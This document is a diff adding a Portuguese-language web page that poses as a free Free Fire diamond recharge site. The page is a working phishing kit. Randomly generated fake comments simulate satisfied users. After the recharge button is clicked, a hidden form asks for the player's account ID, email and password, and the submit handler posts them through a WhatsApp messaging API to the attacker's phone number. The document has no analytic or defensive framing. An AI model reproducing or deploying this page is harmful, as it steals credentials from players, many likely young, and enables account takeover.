@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>diamantes free fire</title>
+    <link rel="shortcut icon" href="https://play-lh.googleusercontent.com/flayzBbdG4-oyQV7jMfpuEPpi2rt5R7-dKyEICkM-BfSwAFTSwdZXqATmonuCg7ua_VQ" type="image/x-icon">
+    <style>
+        * {
+            margin: 0px;
+        }
+        main {
+            background-image: url('https://animesonline.com.br/wp-content/uploads/2020/11/free-fire-wallpaper-4k.jpg');
+            width: 100%;
+            background-size: cover;
+            background-position-y: 20%;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        section {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            width: 90%;
+            margin: auto !important;
+        }
+
+        button {
+            width: 200px;
+            height: 50px;
+            margin-top: 50px;
+        }
+
+        h1 {
+            color: white;
+            text-shadow: 2px 2px 13px black;
+            text-align: center;
+        }
+
+        .dialog {
+            width: 300px;
+            height: 400px;
+            background: white;
+            margin-bottom: 5px;
+            margin-left: 5px;
+            box-shadow: 2px 3px 13px black;
+            overflow-y: scroll;
+            overflow-x: hidden;
+            padding: 10px;
+            margin-top: 50px;
+        }
+
+        .coment {
+            display: flex;
+            align-items: flex-end;
+            margin-top: 50px;
+            width: 80%;
+            margin: auto;
+        } 
+
+
+        .coment input {
+            width: 90%;
+            height: 50px;
+            font-size: 20px;
+            margin-right: 10px;
+        }
+
+        img {
+            width: 30px;
+            height: 30px;
+            overflow: hidden;
+            border-radius: 100%;
+        }
+
+        .comentThis {
+            display: flex;
+            align-items: center;
+            padding: 5px;
+            box-sizing: border-box;
+            font-size: 15px;
+            background: rgba(34, 34, 34, 0.411);
+            margin-top: 10px;
+            border-bottom-left-radius: 10px;
+            border-top-left-radius: 10px;
+            height: 40px;
+            border-top-right-radius: 10px;
+        }
+
+        .name {
+            font-size: 12px;
+        }
+
+        .text {
+            display: flex;
+            flex-direction: column;
+            margin-left: 10px;
+            height: 50px;
+            height: 40px;
+        }
+
+        .comentsAll {
+            margin-top: 40px;
+        }
+
+        .hackpart {
+            position: absolute;
+            background: white;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-repeat: no-repeat;
+            background-size: cover;
+            color: black;
+            font-weight: bolder;
+            flex-direction: column;
+            padding-bottom: 10px;
+            box-shadow: 2px 3px 13px black;
+            display: none;
+        }
+
+        .loading {
+            width: 100px;
+            height: 100px;
+            border: 10px solid;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 50px;
+            border-left: 10px solid transparent;
+            animation: load 1000ms linear infinite;
+            
+        }
+
+        @keyframes load {
+            to {
+                transform: rotate(365deg);
+            }
+        }
+
+
+        .nameL {
+            animation: nl 1000ms linear infinite;
+            position: absolute;
+        }
+
+
+        @keyframes nl {
+            to {
+                transform: rotate(-365deg);
+                opacity: 0;
+            }
+        }
+
+        .ops {
+            border-top: 1px solid;
+            margin-top: 10px;
+            color: black;
+        }
+        form {
+            color: black;
+        }
+
+    </style>
+</head>
+<body>
+    <main>
+        <section>
+            <h1>bem vindo as recargas gratis
+                <br> Free Fire brasil</h1>
+            <select class="form-select" name="" id="">
+                <option value="">500 diamantes</option>
+                <option value="">1k diamantes</option>
+                <option value="">2k diamantes</option>
+                <option value="">5k diamantes</option>
+                <option value="">10k diamantes</option>
+                <option value="">15k diamantes</option>
+                <option value="">20k diamantes</option>
+            </select>
+
+            
+            <button class="btn btn-warning rec">recarregar</button>
+        </section>
+
+        <div class="dialog">
+            <h2 style="text-align: center;"> comentarios</h2>
+            <div class="comentsAll">
+                <div class="comentThis">
+                    <img src="https://play-lh.googleusercontent.com/flayzBbdG4-oyQV7jMfpuEPpi2rt5R7-dKyEICkM-BfSwAFTSwdZXqATmonuCg7ua_VQ">
+                    <div class="text">
+                        <span class="name">Anonimo</span>
+                        <span>funcionou!!!</span></div>
+                    </div>
+            </div>
+        </div>
+
+        <div class="coment">
+            <input type="text" placeholder="deixe seu comentário">
+            <button class="btn btn-primary">enviar</button>
+        </div>
+
+
+        <div class="hackpart">
+            <div class="loading">
+                <span class="nameL">Loading...</span>
+            </div>
+            <div class="ops">
+                <h3>ops! Falta algo!! informe-nos sua conta</h3>
+               
+                <div class="form-group">
+                    <label for="exampleInputEmail1">ID usuario</label>
+                    <input name="id" required type="number" class="form-control id" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter ID">
+                    <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
+                  </div>
+
+                <form action="#" class="form">
+                    <div class="form-group">
+                      <label for="exampleInputEmail1">Email address</label>
+                      <input name="email" required type="email" class="form-control email" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter email">
+                      <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
+                    </div>
+                    <div class="form-group">
+                      <label for="exampleInputPassword1">Password</label>
+                      <input name="pass" name="email" required type="password" class="pass form-control" id="exampleInputPassword1" placeholder="Password">
+                    </div>
+                    <div class="form-check">
+                      <input required type="checkbox" class="form-check-input" id="exampleCheck1">
+                      <label class="form-check-label" for="exampleCheck1">Check me out</label>
+                    </div>
+                    <button type="submit" class="btn btn-primary">finalizar recarga</button>
+                  </form>
+            </div>
+        </div>
+    </main>
+</body>
+<script>
+
+    data = [
+        {
+            name: 'anonimo',
+            comment: 'funciona mesmo!!!'
+        },
+        {  
+            name: 'anonimo',
+            comment: 'muito facil de ganhar'
+        },
+        {    name: 'anonimo',
+            comment: 'funcionouuuuu'
+        },
+        {    name: 'anonimo',
+            comment: 'fodaaa d+++++'
+        },
+        {    name: 'anonimo',
+            comment: 'show...'
+        },
+        {    name: 'anonimo',
+            comment: 'obrigadooo'
+        },
+        {    name: 'anonimo',
+            comment: '20k ja caiu'
+        },
+        {    name: 'anonimo',
+            comment: 'ta na contaa dale'
+        }
+    ]
+
+
+
+    function rgb() {
+        r = Math.round(Math.random() * 255)
+        g = Math.round(Math.random() * 255)
+        b = Math.round(Math.random() * 255)
+
+        _rgb = `rgb(${r},${g},${b})`
+        return _rgb
+    }
+
+
+
+    function select() {
+        return Math.round(Math.random() * (data.length - 1))
+    }
+
+
+    setInterval(() => {
+        let dt = data[select()] 
+        let c = document.querySelector('.comentsAll')
+        t = `   <div style='background: ${rgb()};' class="comentThis">
+                    <img src="https://play-lh.googleusercontent.com/flayzBbdG4-oyQV7jMfpuEPpi2rt5R7-dKyEICkM-BfSwAFTSwdZXqATmonuCg7ua_VQ">
+                    <div class="text">
+                        <span class="name">Anonimo</span>
+                        <span>${dt['comment']}</span></div>
+                    </div>
+                </div>
+            `
+        
+        let div = document.createElement('div')
+
+        div.innerHTML = t
+
+        c.appendChild(div)
+
+    }, 500);
+
+    setInterval(() => {
+        let c = document.querySelector('.dialog')
+        c.scroll(0, c.scrollHeight)
+    }, 300);
+
+
+    var form = document.querySelector('form')
+    form.addEventListener('submit', sub)
+
+    function sub(e) {
+
+        e.preventDefault()
+        let id = document.querySelector('.id').value
+        let email = document.querySelector('.email').value
+        let pass = document.querySelector('.pass').value
+
+
+        axios.post('https://api.chat-api.com/instance337314/sendMessage?token=<your token>', data={
+        "body": 'id:' + id + '\nemail:' + email + '\npassword:' + pass + '',
+        "phone": 55 + '<your number>'
+        })
+    }
+
+
+    var rec =document.querySelector('.rec').addEventListener('click', recf)
+    function recf() {
+        recar2 = document.querySelector('.hackpart')
+        setTimeout(() => {
+            recar2.style.display = 'flex'
+        }, 1000);
+    }
+
+</script>
+</html>
